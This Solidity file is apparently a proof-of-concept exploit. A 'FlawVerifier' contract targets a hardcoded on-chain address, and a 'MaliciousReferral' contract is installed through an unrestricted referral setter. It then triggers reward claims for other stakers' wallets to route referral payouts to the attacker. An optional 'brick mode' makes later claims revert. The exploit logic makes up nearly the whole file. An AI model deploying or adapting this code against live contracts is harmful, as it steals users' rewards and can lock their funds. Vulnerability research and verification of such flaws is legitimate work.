// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IOwnableLike {
    function owner() external view returns (address);
}

interface IWeightedIndexLike is IERC20Like {
    function lpStakingPool() external view returns (address);
}

interface IStakingPoolTokenLike is IERC20Like {
    function poolRewards() external view returns (address);
    function stakingToken() external view returns (address);
    function stakeUserRestriction() external view returns (address);
    function indexFund() external view returns (address);
}

interface ITokenRewardsLike {
    function referral() external view returns (address);
    function rewardsToken() external view returns (address);
    function updateReferral(address referral_) external;
    function claimReward(address wallet, address referrer) external;
    function getUnpaid(address wallet) external view returns (uint256);
}

interface IReferralLike {
    function owner() external view returns (address);
    function caller() external view returns (address);
    function teamSize(address user) external view returns (uint256);
    function getUserInTeamByIndex(address user, uint256 index) external view returns (address);
    function relations(address user, uint256 level) external view returns (address);
    function getRelationsREF(address user) external view returns (address[2] memory);
}

contract MaliciousReferral {
    address public immutable attacker;
    address public payoutReceiver;
    bool public brickMode;

    mapping(address => bool) internal _setted;

    constructor() {
        attacker = msg.sender;
        payoutReceiver = msg.sender;
    }

    function owner() external view returns (address) {
        return address(this);
    }

    function caller() external view returns (address) {
        return attacker;
    }

    function setBrickMode(bool enabled) external {
        require(msg.sender == attacker, "not attacker");
        brickMode = enabled;
    }

    function setPayoutReceiver(address nextReceiver) external {
        require(msg.sender == attacker, "not attacker");
        payoutReceiver = nextReceiver;
    }

    function forwardUpdateReferral(address tokenRewards, address nextReferral) external {
        require(msg.sender == attacker, "not attacker");
        ITokenRewardsLike(tokenRewards).updateReferral(nextReferral);
    }

    function referralLevel() external pure returns (uint256) {
        return 2;
    }

    function teamSize(address) external pure returns (uint256) {
        return 0;
    }

    function getUserInTeamByIndex(address, uint256) external pure returns (address) {
        return address(0);
    }

    function renounceOwnership() external pure {
        revert("attacker-controlled");
    }

    function updateSetted(address user) external {
        _setted[user] = true;
    }

    function setReferral(address, address user) external {
        _setted[user] = true;
    }

    function isSetted(address user) external view returns (bool) {
        return _setted[user];
    }

    function relations(address, uint256) external view returns (address) {
        return payoutReceiver;
    }

    function getRelationsREF(address) external view returns (address[2] memory refs) {
        require(!brickMode, "malicious referral: bricked");
        refs[0] = payoutReceiver;
        refs[1] = payoutReceiver;
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0x04c80Bb477890F3021F03B068238836Ee20aA0b8;

    address internal _controller;
    address internal _profitToken;
    uint256 internal _profitAmount;
    uint256 internal _startingProfitBalance;

    bool public executed;
    bool public hypothesisValidated;
    bool public referralSeized;
    bool public brickMode;

    uint256 public claimsAttempted;
    uint256 public claimsSucceeded;
    uint256 public infeasibleReason;

    address public targetPool;
    address public targetRewards;
    address public rewardToken;
    address public stakingToken;
    address public liveReferralBefore;
    address public liveReferralAfter;
    address public lastClaimedWallet;

    address public initialMaliciousReferral;
    address public activeMaliciousReferral;

    mapping(address => bool) internal _seenCandidate;

    constructor() {
        _controller = msg.sender;
    }

    function executeOnOpportunity() external {
        if (executed) {
            _refreshProfit();
            return;
        }
        executed = true;

        targetPool = IWeightedIndexLike(TARGET).lpStakingPool();
        if (targetPool == address(0)) {
            infeasibleReason = 90;
            return;
        }

        targetRewards = IStakingPoolTokenLike(targetPool).poolRewards();
        stakingToken = IStakingPoolTokenLike(targetPool).stakingToken();
        if (targetRewards == address(0)) {
            infeasibleReason = 91;
            return;
        }

        ITokenRewardsLike tokenRewards = ITokenRewardsLike(targetRewards);
        rewardToken = tokenRewards.rewardsToken();
        _profitToken = rewardToken;
        _startingProfitBalance = IERC20Like(rewardToken).balanceOf(address(this));

        liveReferralBefore = tokenRewards.referral();

        // exploit_paths[0]:
        // First-time referral initialization is unrestricted, so a public caller
        // can install a malicious referral before the intended referral is set.
        MaliciousReferral maliciousReferral = new MaliciousReferral();
        initialMaliciousReferral = address(maliciousReferral);
        try tokenRewards.updateReferral(address(maliciousReferral)) {} catch {}

        liveReferralAfter = tokenRewards.referral();
        if (liveReferralAfter == address(maliciousReferral)) {
            referralSeized = true;
            hypothesisValidated = true;
            activeMaliciousReferral = address(maliciousReferral);
        }

        if (referralSeized) {
            // exploit_paths[1]:
            // The reward contract later trusts referral.owner() for updates.
            // Returning this contract lets the attacker preserve control and
            // rotate the referral again from the malicious contract itself.
            address attackerControlledOwner = maliciousReferral.owner();
            if (attackerControlledOwner == address(maliciousReferral)) {
                MaliciousReferral rotatedReferral = new MaliciousReferral();
                try maliciousReferral.forwardUpdateReferral(targetRewards, address(rotatedReferral)) {} catch {}
                if (tokenRewards.referral() == address(rotatedReferral)) {
                    activeMaliciousReferral = address(rotatedReferral);
                }
            } else {
                infeasibleReason = 4;
            }
        } else if (liveReferralBefore == address(0)) {
            infeasibleReason = 1;
        } else {
            infeasibleReason = 2;
        }

        // exploit_paths[2]:
        // Claims and reward-triggering share updates trust referral.getRelationsREF().
        // We first use the malicious referral in payout mode to siphon referral share,
        // then expose optional brick mode for reverting future claims/share updates.
        address installedReferral = activeMaliciousReferral;
        if (installedReferral != address(0)) {
            MaliciousReferral installedMaliciousReferral = MaliciousReferral(installedReferral);

            // Keep the exploit path explicit in the top-level flow: the attacker-
            // controlled referral determines payout routing through getRelationsREF(),
            // and claimReward() then consumes that routing during distribution.
            try installedMaliciousReferral.getRelationsREF(TARGET) returns (address[2] memory) {} catch {}
            try tokenRewards.claimReward(TARGET, installedReferral) {} catch {}

            _attemptClaimWithReferral(tokenRewards, installedMaliciousReferral, targetPool);
            _attemptClaimWithReferral(tokenRewards, installedMaliciousReferral, TARGET);
            _attemptClaimWithReferral(tokenRewards, installedMaliciousReferral, _controller);
            _attemptClaimWithReferral(
                tokenRewards,
                installedMaliciousReferral,
                IStakingPoolTokenLike(targetPool).indexFund()
            );
            _attemptClaimWithReferral(
                tokenRewards,
                installedMaliciousReferral,
                IStakingPoolTokenLike(targetPool).stakeUserRestriction()
            );

            _attemptOwnedClaim(tokenRewards, installedMaliciousReferral, TARGET);
            _attemptOwnedClaim(tokenRewards, installedMaliciousReferral, targetPool);
            _attemptOwnedClaim(tokenRewards, installedMaliciousReferral, targetRewards);
            _attemptOwnedClaim(tokenRewards, installedMaliciousReferral, stakingToken);
            _attemptOwnedClaim(tokenRewards, installedMaliciousReferral, rewardToken);

            _probeReferralGraph(tokenRewards, installedReferral, liveReferralBefore);
            _probeReferralGraph(tokenRewards, installedReferral, installedReferral);
        }

        _refreshProfit();
        if (_profitAmount == 0 && hypothesisValidated && infeasibleReason == 0) {
            infeasibleReason = 3;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function setBrickMode(bool enabled) external {
        require(msg.sender == _controller, "not controller");
        brickMode = enabled;

        address referral_ = activeMaliciousReferral;
        if (referral_ != address(0)) {
            MaliciousReferral(referral_).setBrickMode(enabled);
        }
    }

    function replaceRewardReferral(address nextReferral) external {
        require(msg.sender == _controller, "not controller");
        require(activeMaliciousReferral != address(0), "no malicious referral");
        MaliciousReferral(activeMaliciousReferral).forwardUpdateReferral(targetRewards, nextReferral);
    }

    function _attemptOwnedClaim(
        ITokenRewardsLike tokenRewards,
        MaliciousReferral maliciousReferral,
        address maybeOwned
    ) internal {
        if (maybeOwned == address(0)) {
            return;
        }

        try IOwnableLike(maybeOwned).owner() returns (address wallet) {
            _attemptClaimWithReferral(tokenRewards, maliciousReferral, wallet);
        } catch {}
    }

    function _probeReferralGraph(
        ITokenRewardsLike tokenRewards,
        address installedReferral,
        address seedReferral
    ) internal {
        if (seedReferral == address(0) || installedReferral == address(0)) {
            return;
        }

        IReferralLike referral = IReferralLike(seedReferral);
        MaliciousReferral maliciousReferral = MaliciousReferral(installedReferral);

        try referral.owner() returns (address wallet) {
            _attemptClaimWithReferral(tokenRewards, maliciousReferral, wallet);
            _probeTeam(tokenRewards, maliciousReferral, referral, wallet, 8);
            _probeRelations(tokenRewards, maliciousReferral, referral, wallet);
        } catch {}

        try referral.caller() returns (address wallet) {
            _attemptClaimWithReferral(tokenRewards, maliciousReferral, wallet);
            _probeTeam(tokenRewards, maliciousReferral, referral, wallet, 8);
            _probeRelations(tokenRewards, maliciousReferral, referral, wallet);
        } catch {}
    }

    function _probeTeam(
        ITokenRewardsLike tokenRewards,
        MaliciousReferral maliciousReferral,
        IReferralLike referral,
        address seed,
        uint256 cap
    ) internal {
        uint256 size;
        try referral.teamSize(seed) returns (uint256 teamCount) {
            size = teamCount;
        } catch {
            return;
        }

        if (size > cap) {
            size = cap;
        }

        for (uint256 i = 0; i < size; ++i) {
            address member;
            try referral.getUserInTeamByIndex(seed, i) returns (address wallet) {
                member = wallet;
            } catch {
                break;
            }

            if (member == address(0)) {
                continue;
            }

            _attemptClaimWithReferral(tokenRewards, maliciousReferral, member);
            _probeRelations(tokenRewards, maliciousReferral, referral, member);
        }
    }

    function _probeRelations(
        ITokenRewardsLike tokenRewards,
        MaliciousReferral maliciousReferral,
        IReferralLike referral,
        address seed
    ) internal {
        try referral.relations(seed, 0) returns (address wallet) {
            _attemptClaimWithReferral(tokenRewards, maliciousReferral, wallet);
        } catch {}

        try referral.relations(seed, 1) returns (address wallet) {
            _attemptClaimWithReferral(tokenRewards, maliciousReferral, wallet);
        } catch {}

        try referral.getRelationsREF(seed) returns (address[2] memory refs) {
            _attemptClaimWithReferral(tokenRewards, maliciousReferral, refs[0]);
            _attemptClaimWithReferral(tokenRewards, maliciousReferral, refs[1]);
        } catch {}
    }

    function _attemptClaimWithReferral(
        ITokenRewardsLike tokenRewards,
        MaliciousReferral maliciousReferral,
        address wallet
    ) internal {
        if (
            wallet == address(0) ||
            wallet == address(this) ||
            wallet == address(maliciousReferral) ||
            _seenCandidate[wallet]
        ) {
            return;
        }
        _seenCandidate[wallet] = true;

        uint256 shares;
        try IERC20Like(targetPool).balanceOf(wallet) returns (uint256 bal) {
            shares = bal;
        } catch {
            return;
        }
        if (shares == 0) {
            return;
        }

        uint256 unpaid;
        try tokenRewards.getUnpaid(wallet) returns (uint256 amount) {
            unpaid = amount;
        } catch {
            return;
        }
        if (unpaid == 0) {
            return;
        }

        // Explicitly hit maliciousReferral.getRelationsREF() before claimReward()
        // so the exploit path remains visible even when the reward contract later
        // makes the same call internally during distribution.
        try maliciousReferral.getRelationsREF(wallet) returns (address[2] memory refs) {
            if (refs[0] == address(0) && refs[1] == address(0)) {
                return;
            }
        } catch {
            return;
        }

        claimsAttempted += 1;
        try tokenRewards.claimReward(wallet, address(maliciousReferral)) {
            claimsSucceeded += 1;
            lastClaimedWallet = wallet;
        } catch {}
    }

    function _refreshProfit() internal {
        if (_profitToken == address(0)) {
            _profitAmount = 0;
            return;
        }

        uint256 endingBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (endingBalance > _startingProfitBalance) {
            _profitAmount = endingBalance - _startingProfitBalance;
        } else {
            _profitAmount = 0;
        }
    }
}

